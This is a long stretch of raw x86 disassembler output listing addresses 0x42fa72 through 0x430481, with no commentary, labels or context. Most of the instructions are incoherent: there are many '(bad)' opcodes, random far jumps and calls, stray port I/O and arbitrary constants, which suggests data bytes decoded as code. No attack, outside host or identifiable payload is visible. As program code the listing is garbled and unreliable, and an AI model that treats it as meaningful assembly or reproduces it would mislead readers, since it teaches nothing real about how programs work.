  42fa72:	jmp    0xe954:0xb5c0039f
  42fa79:	inc    edi
  42fa7a:	iret   
  42fa7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa7c:	push   ss
  42fa7d:	addr16 push 0x44
  42fa80:	shr    DWORD PTR [esi+eiz*4],1
  42fa83:	(bad)  
  42fa84:	call   0xc5236498
  42fa89:	lea    edx,[eax+0x62bfa00c]
  42fa8f:	cmp    eax,DWORD PTR [eax]
	...
  42faf1:	add    BYTE PTR [eax],al
  42faf3:	add    BYTE PTR [ebx],bl
  42faf5:	out    dx,eax
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	aam    0xa6
  42fb02:	ss das 
  42fb04:	jl     0x42fb04
  42fb06:	add    DWORD PTR [eax],eax
  42fb08:	add    al,0x1
  42fb0a:	add    BYTE PTR [eax],al
  42fb0c:	xor    al,0x3a
  42fb0e:	jne    0x42fb51
  42fb10:	fadd   QWORD PTR [eax+0x48]
  42fb13:	jle    0x42fb23
  42fb15:	push   ebp
  42fb16:	xor    DWORD PTR [eax-0x79357e17],ecx
  42fb1c:	imul   ecx,DWORD PTR [edi-0x4e919172],0xd22ff455
  42fb26:	xor    ch,BYTE PTR [ebx+0x76]
  42fb29:	xchg   ebp,eax
  42fb2a:	ss inc ebx
  42fb2c:	into   
  42fb2d:	xor    ecx,DWORD PTR [esi-0x36]
  42fb30:	xor    BYTE PTR [eax+0x18],bh
  42fb33:	pop    esp
  42fb34:	push   0x8684e6bb
  42fb39:	inc    DWORD PTR [esi+0x39c06d90]
  42fb3f:	pop    ebx
  42fb40:	sbb    DWORD PTR [esi],ecx
  42fb42:	dec    edx
  42fb43:	adc    BYTE PTR [ebx],ch
  42fb45:	adc    al,0xb5
  42fb47:	pop    ss
  42fb48:	add    edi,edx
  42fb4a:	lods   eax,DWORD PTR ds:[esi]
  42fb4b:	mov    al,ds:0x8224c1e9
  42fb50:	xchg   ecx,eax
  42fb51:	call   0xb4716857
  42fb56:	mov    bl,0x76
  42fb58:	out    0x46,al
  42fb5a:	adc    DWORD PTR [edi+esi*4-0x652d2927],esp
  42fb61:	into   
  42fb62:	pop    ecx
  42fb63:	add    DWORD PTR [ecx+0x49b91a7c],ebp
  42fb69:	pop    ss
  42fb6a:	mov    ch,0x60
  42fb6c:	mov    ebp,0xaf758809
  42fb71:	std    
  42fb72:	shl    BYTE PTR [eax-0x1b],cl
  42fb75:	xchg   ebx,eax
  42fb76:	xor    bl,BYTE PTR [ecx+eiz*2+0x52891431]
  42fb7d:	ins    DWORD PTR es:[edi],dx
  42fb7e:	int    0x44
  42fb80:	not    BYTE PTR [edi+0x20]
  42fb83:	popf   
  42fb84:	dec    ebp
  42fb85:	cs jp  0x42fb95
  42fb88:	add    al,0xda
  42fb8a:	sbb    dl,bh
  42fb8c:	xchg   ebp,eax
  42fb8d:	test   dh,0xc
  42fb90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fb91:	popf   
  42fb92:	mov    ds:0x5ab1d26b,al
  42fb97:	(bad)
  42fb9b:	and    dl,BYTE PTR [ebx+0x67ed0e12]
  42fba1:	mov    esp,0x30d01011
  42fba6:	jne    0x42fb2e
  42fba8:	iret   
  42fba9:	adc    al,0xb3
  42fbab:	push   ecx
  42fbac:	xchg   DWORD PTR [edi-0x75edaf04],eax
  42fbb2:	sub    BYTE PTR [eax+0x4669aed1],ch
  42fbb8:	das    
  42fbb9:	(bad)  
  42fbba:	inc    ebp
  42fbbb:	xchg   DWORD PTR [ebx+0x29],ecx
  42fbbe:	push   ecx
  42fbbf:	jne    0x42fbaf
  42fbc1:	or     eax,0x2cb8691c
  42fbc6:	das    
  42fbc7:	sub    al,0xd5
  42fbc9:	xrelease mov DWORD PTR [ebp-0x21ad565a],ebx
  42fbd0:	or     BYTE PTR [edx+edi*1],0x77
  42fbd4:	pop    esp
  42fbd5:	dec    eax
  42fbd6:	das    
  42fbd7:	dec    ebx
  42fbd8:	cs rcr cl,0xd5
  42fbdc:	xchg   edi,eax
  42fbdd:	std    
  42fbde:	fdivr  QWORD PTR [ecx]
  42fbe0:	les    edx,FWORD PTR [eax-0x3d670ee1]
  42fbe6:	sar    BYTE PTR [edx],1
  42fbe8:	cld    
  42fbe9:	repz xchg ebp,eax
  42fbeb:	xor    BYTE PTR [eax-0x155e373d],dh
  42fbf1:	test   DWORD PTR ds:[edx+0x2c0b8633],edi
  42fbf8:	pop    edi
  42fbf9:	clc    
  42fbfa:	mov    edx,0x748fa4fa
  42fbff:	paddq  mm3,QWORD PTR [ecx+0x6560c6d2]
  42fc06:	ror    BYTE PTR [edx+0x1e],0x31
  42fc0a:	clc    
  42fc0b:	int    0x53
  42fc0d:	or     ebx,DWORD PTR [edx+ebp*8]
	...
  42fc74:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fc7a:	mov    ebx,0x36325e9a
  42fc7f:	and    BYTE PTR [ebp-0x3],ch
  42fc82:	and    al,0xbb
  42fc84:	cmp    bh,0x1
  42fc87:	add    BYTE PTR [ecx+eax*1],al
  42fc8a:	add    BYTE PTR [eax],al
  42fc8c:	and    al,0x60
  42fc8e:	or     edi,DWORD PTR [esi-0x38a3d1cc]
  42fc94:	dec    ebp
  42fc95:	pop    ecx
  42fc96:	repz pushf 
  42fc98:	ret    
  42fc99:	in     eax,dx
  42fc9a:	rol    DWORD PTR [edx-0x17],1
  42fc9d:	fsubr  st(3),st
  42fc9f:	dec    ecx
  42fca0:	inc    eax
  42fca1:	fimul  WORD PTR [ebp-0x16d2f885]
  42fca7:	jno    0x42fcda
  42fca9:	adc    BYTE PTR [ebx+0x19],bh
  42fcac:	sbb    eax,0x6d498219
  42fcb1:	cmp    BYTE PTR [ebp+ebx*2+0x6b8cf886],ah
  42fcb8:	pop    edx
  42fcb9:	mov    ecx,0xa96b4012
  42fcbe:	loopne 0x42fc62
  42fcc0:	lea    esi,[ebx]
  42fcc2:	pusha  
  42fcc3:	or     bl,al
  42fcc5:	fsub   st(2),st
  42fcc7:	rcl    DWORD PTR [edx+eiz*2],1
  42fcca:	stos   DWORD PTR es:[edi],eax
  42fccb:	mov    ebx,0x34f12923
  42fcd0:	add    ebp,DWORD PTR [ecx-0x4]
  42fcd3:	test   DWORD PTR [esi+0x66ec09ba],esp
  42fcd9:	cmp    dl,BYTE PTR [esi]
  42fcdb:	mov    eax,ds:0xe7b0cf3
  42fce0:	out    dx,al
  42fce1:	cld    
  42fce2:	mov    ebx,DWORD PTR [esi-0x704f5dc8]
  42fce8:	dec    edx
  42fce9:	dec    esp
  42fcea:	push   ecx
  42fceb:	fidiv  WORD PTR [edx-0x2]
  42fcee:	lds    esi,FWORD PTR [eax-0x32]
  42fcf1:	ins    DWORD PTR es:[edi],dx
  42fcf2:	icebp  
  42fcf3:	retf   
  42fcf4:	or     al,0x6d
  42fcf6:	adc    esi,edx
  42fcf8:	fidivr DWORD PTR [ebp+0x7b]
  42fcfb:	rcr    BYTE PTR [ebx+ebp*8],cl
  42fcfe:	and    DWORD PTR [ebx],0x7771fe75
  42fd04:	cmp    al,BYTE PTR [ebx+eiz*1-0x4d]
  42fd08:	jns    0x42fd2e
  42fd0a:	out    0x7,eax
  42fd0c:	adc    BYTE PTR [esp+eax*2],0x67
  42fd10:	xchg   esi,eax
  42fd11:	inc    esp
  42fd12:	lods   al,BYTE PTR ds:[esi]
  42fd13:	and    DWORD PTR [ecx+0x416a69e3],edi
  42fd19:	rcl    edx,cl
  42fd1b:	mov    WORD PTR [edi-0xb],ss
  42fd1e:	cld    
  42fd1f:	int    0x40
  42fd21:	sbb    eax,0x43bb6ed7
  42fd26:	addr16 adc dh,dl
  42fd29:	xor    BYTE PTR [edi],ah
  42fd2b:	mov    eax,ds:0x2152ae86
  42fd30:	dec    esi
  42fd31:	or     al,0xc5
  42fd33:	outs   dx,BYTE PTR ds:[esi]
  42fd34:	mov    edi,0xdb39b564
  42fd39:	leave  
  42fd3a:	mov    ch,0xcd
  42fd3c:	xchg   ebx,eax
  42fd3d:	sbb    dh,BYTE PTR [edx+ecx*2]
  42fd40:	ret    0x2c48
  42fd43:	loope  0x42fda0
  42fd45:	mov    dl,0xbb
  42fd47:	push   edx
  42fd48:	mov    dh,0x8a
  42fd4a:	cmp    esi,DWORD PTR [eax+edi*4]
  42fd4d:	repz xchg edi,eax
  42fd4f:	ret    0x49e2
  42fd52:	adc    DWORD PTR [edi+0x68a5de4e],edi
  42fd58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fd59:	mul    BYTE PTR [eax+0x1a]
  42fd5c:	mov    bh,0x70
  42fd5e:	repnz mov al,0x68
  42fd61:	fcomp  DWORD PTR [ebx]
  42fd63:	pop    edi
  42fd64:	in     al,dx
  42fd65:	dec    edi
  42fd66:	call   0x9bbe:0xfcc8f649
  42fd6d:	push   ebp
  42fd6e:	and    al,0x3f
  42fd70:	or     edx,DWORD PTR [esi-0x55b91faf]
  42fd76:	dec    ecx
  42fd77:	mov    al,0xa7
  42fd79:	into   
  42fd7a:	movntq QWORD PTR [eax],mm6
  42fd7d:	aam    0x3c
  42fd7f:	lds    ebp,FWORD PTR [ebx]
  42fd81:	mov    dh,0x31
  42fd83:	inc    ecx
  42fd84:	cmp    eax,DWORD PTR [edx-0x33]
  42fd87:	out    dx,al
  42fd88:	fmul   QWORD PTR [edx+0x2e]
  42fd8b:	inc    esi
  42fd8c:	add    eax,0x3ca20f
	...
  42fdf1:	add    BYTE PTR [eax],al
  42fdf3:	add    BYTE PTR [eax-0x40],cl
  42fdf6:	ret    0xcaf0
  42fdf9:	bnd jp 0x42fdf4
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz fmul st(5),st
  42fe02:	push   ebp
  42fe03:	test   BYTE PTR fs:[eax],al
  42fe06:	add    al,BYTE PTR [eax]
  42fe08:	add    al,0x1
  42fe0a:	add    BYTE PTR [eax],al
  42fe0c:	sub    ecx,ecx
  42fe0e:	mov    WORD PTR [ebp+0x6b9c0a83],es
  42fe14:	mul    DWORD PTR [edx]
  42fe16:	and    esp,DWORD PTR [esi-0x465f046d]
  42fe1c:	data16 arpl WORD PTR [ebp+0x38ffb6a2],cx
  42fe23:	xchg   DWORD PTR [ecx],esp
  42fe25:	fidiv  DWORD PTR [eax+eiz*2+0x53]
  42fe29:	hlt    
  42fe2a:	push   0x44
  42fe2c:	add    eax,0x5f4de102
  42fe31:	pop    eax
  42fe32:	jnp    0x42fe6b
  42fe34:	fimul  WORD PTR [ebp+0x6ae1fdf8]
  42fe3a:	enter  0xffc8,0xa
  42fe3e:	pop    ebx
  42fe3f:	xor    al,0xa7
  42fe41:	(bad)  
  42fe42:	mov    edx,0xd1e45ee0
  42fe47:	stos   BYTE PTR es:[edi],al
  42fe48:	push   ds
  42fe49:	sbb    al,0xc4
  42fe4b:	and    al,0xe7
  42fe4d:	jno    0x42fea6
  42fe4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fe50:	ja     0x42fdf1
  42fe52:	mov    esi,0x949d5d31
  42fe57:	and    eax,0x8e609c3f
  42fe5c:	fwait
  42fe5d:	ror    BYTE PTR [ebx+0x69154f44],1
  42fe63:	in     al,dx
  42fe64:	push   ds
  42fe65:	ret    
  42fe66:	fdivr  QWORD PTR [esi-0x299fea28]
  42fe6c:	pop    edx
  42fe6d:	int3   
  42fe6e:	jnp    0x42fe80
  42fe70:	mov    ecx,0xf2641105
  42fe75:	stos   DWORD PTR es:[edi],eax
  42fe76:	std    
  42fe77:	int3   
  42fe78:	lock cs aad 0x4b
  42fe7c:	aam    0x4
  42fe7e:	or     eax,0xc8547126
  42fe83:	dec    ebx
  42fe84:	jb     0x42fe1f
  42fe86:	inc    esp
  42fe87:	aam    0xae
  42fe89:	cmp    BYTE PTR [ebx-0x1c],ah
  42fe8c:	dec    eax
  42fe8d:	mov    BYTE PTR [esi+esi*4],bh
  42fe90:	jge    0x42feeb
  42fe92:	mov    esp,0xd0b8da3
  42fe97:	popa   
  42fe98:	mov    ah,BYTE PTR [esi]
  42fe9a:	sbb    eax,0x92d24743
  42fe9f:	repnz int3 
  42fea1:	stc    
  42fea2:	xor    al,0x62
  42fea4:	ss int 0xe4
  42fea7:	mov    ds,WORD PTR [ebp+0x63ef234b]
  42fead:	pop    esi
  42feae:	jae    0x42fe30
  42feb0:	icebp  
  42feb1:	dec    edx
  42feb2:	inc    ebp
  42feb3:	imul   esi,DWORD PTR [eax-0x71da0060],0xe158d4f0
  42febd:	and    ch,dl
  42febf:	outs   dx,BYTE PTR ds:[esi]
  42fec0:	mov    DWORD PTR [esi],edi
  42fec2:	popf   
  42fec3:	push   esp
  42fec4:	pusha  
  42fec5:	(bad)  [ecx+0x72]
  42fec8:	mov    dh,0xb4
  42feca:	or     BYTE PTR [edx-0x2aef8933],bh
  42fed0:	daa    
  42fed1:	(bad)  [esi]
  42fed3:	call   0xe037:0x65e95f3f
  42feda:	cmp    BYTE PTR [edx-0x7a17fbd2],ch
  42fee0:	pop    es
  42fee1:	addr16 pop ecx
  42fee3:	push   eax
  42fee4:	in     al,0x31
  42fee6:	popa   
  42fee7:	adc    bl,BYTE PTR [ebx+0x41d7b63c]
  42feed:	ror    DWORD PTR [ecx-0x42],0x9d
  42fef1:	xor    DWORD PTR [ebx+eiz*8-0x3b20a91],edx
  42fef8:	(bad)
  42fefd:	xchg   edi,eax
  42fefe:	inc    ecx
  42feff:	data16 jl 0x42fe9e
  42ff02:	repnz push 0x4e
  42ff05:	mov    ebp,0xae8ecfb4
  42ff0a:	aam    0x83
  42ff0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ff0d:	scas   eax,DWORD PTR es:[edi]
  42ff0e:	xchg   DWORD PTR [edi+0x0],ebx
	...
  42ff74:	add    al,0x67
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [edx+eiz*8+0x7a],0x1
  42ff83:	mov    ds:0x20188,al
  42ff88:	add    al,0x1
  42ff8a:	add    BYTE PTR [eax],al
  42ff8c:	aam    0xe8
  42ff8e:	sbb    edi,esi
  42ff90:	sar    BYTE PTR [ecx+0x2b4480a4],0x22
  42ff97:	aam    0x31
  42ff99:	es clc 
  42ff9b:	(bad)  
  42ff9c:	(bad)  
  42ff9d:	adc    DWORD PTR [ebp+ebx*2-0x33b1930a],esp
  42ffa4:	sbb    dl,BYTE PTR [ebx+0x3da83d82]
  42ffaa:	outs   dx,BYTE PTR ds:[esi]
  42ffab:	dec    ecx
  42ffac:	lods   eax,DWORD PTR ds:[esi]
  42ffad:	pop    esp
  42ffae:	out    dx,al
  42ffaf:	fsubrp st(6),st
  42ffb1:	(bad)  
  42ffb2:	addr16 push cs
  42ffb4:	xchg   ebp,eax
  42ffb5:	xchg   ebp,eax
  42ffb6:	adc    eax,0x5f441759
  42ffbb:	lahf   
  42ffbc:	xor    al,0x5d
  42ffbe:	mov    esi,0xd1fbaf54
  42ffc3:	or     ecx,DWORD PTR [esi-0x932b84d]
  42ffc9:	(bad)  
  42ffca:	pop    ecx
  42ffcb:	popa   
  42ffcc:	aaa    
  42ffcd:	xor    eax,0x9d073601
  42ffd2:	ss and al,0xbe
  42ffd5:	and    DWORD PTR [eax],ebp
  42ffd7:	sbb    edx,DWORD PTR [ebx-0x8009331]
  42ffdd:	aam    0xb1
  42ffdf:	ret    
  42ffe0:	pop    edi
  42ffe1:	gs sub ebx,esp
  42ffe4:	lods   eax,DWORD PTR ds:[esi]
  42ffe5:	pop    ss
  42ffe6:	sub    DWORD PTR [ebx-0x73],edi
  42ffe9:	fild   QWORD PTR [esi]
  42ffeb:	xchg   DWORD PTR [ebp+0x45b9d2d],esi
  42fff1:	mov    ds:0xb8f524ec,al
  42fff6:	outs   dx,BYTE PTR ds:[esi]
  42fff7:	add    DWORD PTR [esi],0xfffffff0
  42fffa:	(bad)  
  42fffb:	outs   dx,BYTE PTR ds:[esi]
  42fffc:	stos   DWORD PTR es:[edi],eax
  42fffd:	mov    ch,0xcf
  42ffff:	xor    cl,BYTE PTR [ecx]
  430001:	out    dx,eax
  430002:	lahf   
  430003:	adc    BYTE PTR [ebx-0x75986279],bh
  430009:	xchg   DWORD PTR [ebx*4-0x21746628],ecx
  430010:	pop    ebx
  430011:	dec    edx
  430012:	add    edi,DWORD PTR [ebp-0x30]
  430015:	ror    DWORD PTR [esp+ecx*2],cl
  430018:	test   al,0x31
  43001a:	cdq    
  43001b:	xor    al,0xa1
  43001d:	inc    ebx
  43001e:	xchg   edx,eax
  43001f:	sbb    al,dh
  430021:	inc    esi
  430022:	gs lock clc 
  430025:	mov    eax,ds:0xcd8e1713
  43002a:	int3   
  43002b:	imul   eax,DWORD PTR [edx+0x5bb3e4f1],0x383a54d5
  430035:	xchg   ebx,eax
  430036:	mov    ebp,fs
  430038:	jecxz  0x430026
  43003a:	shr    DWORD PTR [edi+0x5e251f34],cl
  430040:	add    esp,esi
  430042:	ds leave 
  430044:	and    BYTE PTR [edi+0x34],dh
  430047:	jmpw   0xa6a7
  43004b:	sub    eax,0xa9836019
  430050:	mov    bl,0x4f
  430052:	pop    ds
  430053:	dec    esp
  430054:	mov    BYTE PTR [ecx-0x34],0x73
  430058:	ret    0x4d94
  43005b:	add    al,0x4
  43005d:	iret   
  43005e:	ins    BYTE PTR es:[edi],dx
  43005f:	bnd jg 0x4300c4
  430062:	push   ss
  430063:	loope  0x43005b
  430065:	popf   
  430066:	lods   eax,DWORD PTR ds:[esi]
  430067:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430068:	dec    ebx
  430069:	add    ch,BYTE PTR [esi]
  43006b:	push   ebx
  43006c:	xor    DWORD PTR [eax+0x51b8dcd0],ecx
  430072:	imul   esi,DWORD PTR [ebx+0xff7ea77],0xfffffff1
  430079:	sti    
  43007a:	popa   
  43007b:	or     BYTE PTR [ecx-0x66],ch
  43007e:	mov    ds:0xf6bbf1a4,al
  430083:	lea    esi,[esi]
  430085:	push   esi
  430086:	stos   DWORD PTR es:[edi],eax
  430087:	dec    esi
  430088:	out    dx,eax
  430089:	fdivr  DWORD PTR [ebp-0xede2013]
  43008f:	inc    eax
	...
  4300f4:	(bad)  
  4300f5:	ins    DWORD PTR es:[edi],dx
  4300f6:	aam    0xb5
  4300f8:	(bad)  
  4300f9:	mov    ebp,0x9547fe7
  4300fe:	scas   eax,DWORD PTR es:[edi]
  4300ff:	add    al,0xbc
  430101:	rol    BYTE PTR gs:[eax],1
  430104:	mov    WORD PTR [edx],es
  430106:	add    al,BYTE PTR [eax]
  430108:	jae    0x43010a
  43010a:	add    BYTE PTR [eax],al
  43010c:	ins    DWORD PTR es:[edi],dx
  43010d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43010e:	add    al,BYTE PTR [eax]
  430110:	cmc    
  430111:	push   cs
  430112:	jmp    0x4300d8
  430114:	mov    bl,0xc0
  430116:	frstor [ecx-0x7974c1e8]
  43011c:	dec    ebx
  43011d:	call   0x94752d3e
  430122:	cli    
  430123:	jae    0x430157
  430125:	(bad)  
  430126:	sbb    dh,bl
  430128:	adc    al,0x29
  43012a:	mov    ds:0xc79570ea,eax
  43012f:	and    eax,0xb888ca22
  430134:	in     eax,dx
  430135:	dec    esi
  430136:	dec    esi
  430137:	sub    DWORD PTR [edi+0x1bb52330],0x4b
  43013e:	pop    esp
  43013f:	(bad)  
  430140:	or     al,dl
  430142:	mov    BYTE PTR [ebx+ebp*4-0x25bfaa83],ah
  430149:	xor    dh,BYTE PTR [ebx-0x5d5c174]
  43014f:	inc    eax
  430150:	popa   
  430151:	inc    ecx
  430152:	mov    edi,0x8303f54d
  430157:	data16 sub dl,ah
  43015a:	js     0x430175
  43015c:	cmc    
  43015d:	shl    BYTE PTR [edx+edi*8-0x42],0x88
  430162:	loopne 0x4301c0
  430164:	dec    ecx
  430165:	and    eax,0x7405905f
  43016a:	push   edx
  43016b:	add    al,0x86
  43016d:	sub    DWORD PTR [edi],0x50
  430170:	push   edx
  430171:	mov    cl,0x97
  430173:	pop    esp
  430174:	push   cs
  430175:	push   ebx
  430176:	sub    dh,ch
  430178:	inc    ebp
  430179:	jge    0x43017a
  43017b:	in     eax,0x20
  43017d:	sub    bh,dh
	...
  4301f3:	add    BYTE PTR [ebp+0x55],cl
  4301f6:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  4301fc:	mov    esp,ebp
  4301fe:	or     ah,dh
  430200:	dec    ebp
  430201:	add    bh,al
  430203:	add    BYTE PTR [eax],cl
  430205:	add    BYTE PTR [eax],al
  430207:	mov    DWORD PTR [eax],0x40f44545
  43020d:	xor    DWORD PTR [eax],eax
  43020f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430215:	(bad)  
  430216:	enter  0x4d45,0xbc
  43021a:	mov    esi,DWORD PTR [edx]
  43021c:	hlt    
  43021d:	test   ebx,ecx
  43021f:	pushf  
  430220:	enter  0x4df8,0x8b
  430224:	mov    DWORD PTR [ebp+0x8],0x894708
  43022b:	inc    ebp
  43022c:	mov    ebp,0xff8bfffc
  430231:	dec    ebp
  430232:	mov    ch,0xf4
  430234:	call   DWORD PTR [ebx-0x1]
  430237:	mov    ebx,0x8005474
  43023c:	call   DWORD PTR [ecx+0x8]
  43023f:	pop    es
  430240:	jmp    0xb8:0xacb4533
  430247:	fwait
  430248:	mov    esi,DWORD PTR [edx-0xc]
  43024b:	xor    cl,bl
  43024d:	add    BYTE PTR [ebx+0x3c83203],bl
  430253:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  430259:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  43025f:	xor    eax,DWORD PTR [eax]
  430261:	retf   
  430262:	retf   
  430263:	add    ecx,eax
  430265:	enter  0x894d,0x64
  430269:	dec    ebp
  43026a:	sbb    ah,cl
  43026c:	add    BYTE PTR [ebx-0xb9bb277],cl
  430272:	dec    DWORD PTR [ebx-0xbcfb275]
  430278:	test   DWORD PTR [ebx],esi
  43027a:	dec    ebx
  43027c:	inc    DWORD PTR [ebx]
  43027e:	inc    eax
  43027f:	enter  0x8989,0x50
  430283:	(bad)  
  430284:	call   DWORD PTR [ebx+ecx*4-0x1]
  430288:	cld    
  430289:	dec    DWORD PTR [ebp-0xa90001]
  43028f:	push   edi
  430290:	mov    BYTE PTR [edx+0x1],ch
  430293:	and    al,BYTE PTR [eax]
  430295:	pop    ecx
  430296:	inc    ebp
  430297:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43029d:	push   0xffffff89
  43029f:	pop    ecx
  4302a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4302a1:	dec    ebp
  4302a2:	add    BYTE PTR [ecx+0x45fc088b],cl
  4302a8:	jne    0x4302f4
  4302aa:	lea    eax,[eax]
  4302ac:	push   eax
  4302ad:	(bad)  
  4302ae:	dec    DWORD PTR [eax]
  4302b0:	mov    DWORD PTR [eax],eax
  4302b2:	test   al,0x0
  4302b4:	add    BYTE PTR [ebp-0x18],cl
  4302b7:	xor    ebp,DWORD PTR [ebx]
  4302b9:	add    eax,DWORD PTR [eax]
  4302bb:	mov    eax,eax
  4302bd:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4302c4:	inc    ebp
  4302c5:	mov    DWORD PTR [ebx+0x459408],ecx
  4302cb:	arpl   WORD PTR [ebx-0x372749b],cx
  4302d1:	sub    al,0x80
  4302d3:	inc    DWORD PTR [ecx]
  4302d5:	lea    eax,[eax]
  4302d7:	or     al,0x0
  4302d9:	inc    DWORD PTR [ecx-0x18]
  4302dc:	mov    ecx,DWORD PTR [ebx]
  4302de:	cld    
  4302df:	add    BYTE PTR [ecx+0x75014d],cl
  4302e5:	(bad)  
  4302e6:	xchg   ebp,eax
  4302e7:	fdivr  st,st(7)
  4302e9:	inc    eax
  4302ea:	inc    DWORD PTR [eax]
  4302ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4302ef:	xor    edx,DWORD PTR [edx+0x7201b8]
  4302f5:	add    BYTE PTR [edx],dl
  4302f7:	enter  0x4d90,0x0
  4302fb:	mov    eax,DWORD PTR [eax]
  4302fd:	hlt    
  4302fe:	add    al,0xa5
  430300:	mov    al,0xff
  430302:	add    bh,bh
  430304:	add    BYTE PTR [ebx],dh
  430306:	inc    DWORD PTR [ebx]
  430308:	sbb    al,0x89
  43030a:	jne    0x4302e8
  43030c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430312:	mov    eax,DWORD PTR [ebp-0xff0048]
  430318:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43031f:	inc    DWORD PTR [ebp-0x75]
  430322:	fisttp QWORD PTR [esi+ebp*8]
  430325:	test   DWORD PTR [esi-0x1],esp
  430328:	inc    ebp
  430329:	(bad)  
  43032a:	aas    
  43032b:	inc    ebp
  43032c:	(bad)  
  43032d:	lea    edi,[esp+eiz*2-0x1]
  430331:	inc    edi
  430333:	mov    DWORD PTR ds:0x8000c7a0,edi
  430339:	mov    ebp,esp
  43033b:	cld    
  43033c:	loop   0x4302cb
  43033e:	inc    ebp
  43033f:	(bad)  
  430340:	out    dx,al
  430341:	(bad)  
  430342:	fisttp WORD PTR [eax+0x8801c7]
  430348:	jecxz  0x43038f
  43034a:	in     al,dx
  43034b:	inc    DWORD PTR [ebp-0x4]
  43034e:	out    0x8d,eax
  430350:	aas    
  430351:	inc    edi
  430353:	jmp    FWORD PTR [eax-0x78]
  430356:	inc    DWORD PTR [ecx]
  430358:	mov    DWORD PTR [eax],0xc7043d
  43035e:	ins    BYTE PTR es:[edi],dx
  43035f:	test   edi,edi
  430361:	pandn  mm0,mm5
  430364:	aas    
  430365:	add    bh,al
  430367:	mov    esi,DWORD PTR [eax-0x4]
  43036a:	inc    DWORD PTR [eax+0xdf01ee]
  430370:	(bad)  
  430371:	or     BYTE PTR [ebp+eax*2-0x1],dh
  430375:	mov    ebp,ebx
  430377:	xchg   esp,eax
  430378:	fild   DWORD PTR [eax]
  43037a:	(bad)  
  43037b:	mov    edi,DWORD PTR [eax+0x3]
  43037e:	(bad)  
  43037f:	cmp    al,0xe7
  430381:	dec    ebp
  430382:	leave  
  430383:	mov    ebp,eax
  430385:	fsubr  DWORD PTR [edx]
  430387:	add    BYTE PTR [eax],al
  430389:	lea    ecx,[ebx-0x7f0003b4]
  43038f:	push   edx
  430390:	add    DWORD PTR [ebp+0x0],edx
  430393:	mov    esi,DWORD PTR [eax]
  430395:	mov    WORD PTR [edi],ss
  430397:	add    BYTE PTR [eax],al
  430399:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43039f:	add    ah,bh
  4303a1:	push   0x7d
  4303a3:	dec    DWORD PTR [ebx+0xd88c]
  4303a9:	push   edx
  4303aa:	mov    edx,DWORD PTR [ecx-0x4]
  4303ad:	call   DWORD PTR [eax+0x7d01fc]
  4303b3:	mov    esi,DWORD PTR [esi]
  4303b5:	cld    
  4303b6:	add    BYTE PTR [eax+0x560150],dl
  4303bc:	test   DWORD PTR [ebp+0x75],eax
  4303bf:	loop   0x43034c
  4303c1:	jmp    0xe38b:0x947dc7fc
  4303c8:	fsub   st,st(7)
  4303ca:	add    bh,al
  4303cc:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  4303d2:	add    edi,edi
  4303d4:	add    bh,bh
  4303d6:	adc    al,0xed
  4303d8:	add    dh,ah
  4303da:	push   eax
  4303db:	inc    ebp
  4303dc:	push   esi
  4303dd:	fisttp WORD PTR [ebx+0x4dc7f43f]
  4303e3:	test   BYTE PTR [ebx],dh
  4303e5:	out    0x5,al
  4303e7:	shl    BYTE PTR [edx+0x45],0x0
  4303eb:	jmp    0x4303ae
  4303ed:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  4303f4:	inc    esi
  4303f5:	jle    0x4303f7
  4303f7:	test   edi,eax
  4303f9:	(bad)  
  4303fa:	call   0x13004fe
  4303ff:	out    0x75,al
  430401:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430407:	in     al,dx
  430408:	mov    esp,edx
  43040a:	mov    ah,0x85
  43040c:	add    bh,bh
  43040e:	call   0x1292e12
  430413:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43041a:	add    ebx,esp
  43041c:	add    ah,ch
  43041e:	xor    BYTE PTR [ebp-0xff0073],al
  430424:	mov    ebx,ebp
  430426:	cld    
  430427:	jle    0x4303b2
  430429:	add    DWORD PTR gs:[eax],eax
  43042c:	add    BYTE PTR [eax+0x1],dl
  43042f:	inc    ebp
  430430:	inc    ebp
  430431:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  430437:	dec    DWORD PTR [ebx-0x3fd80318]
  43043d:	add    BYTE PTR [ebp-0xbf0040],dl
  430443:	inc    ebp
  430444:	fmul   QWORD PTR [ebx-0x4faf0400]
  43044a:	inc    ebp
  43044b:	add    DWORD PTR [ebx+0x459c00],ecx
  430451:	mov    edi,edi
  430453:	mov    eax,0xe80800ff
  430458:	inc    ebp
  430459:	sub    cl,BYTE PTR [ebx-0x47000400]
  43045f:	add    al,0x1
  430461:	rol    BYTE PTR [eax],0x1e
  430464:	jne    0x4304ab
  430466:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  43046c:	inc    DWORD PTR [ecx]
  43046e:	call   0x882d73
  430473:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  430479:	call   0x432e7f
  43047e:	xor    bh,bh
  430480:	push   edi
  430481:	adc    BYTE PTR [ebx-0x74741bbb],al
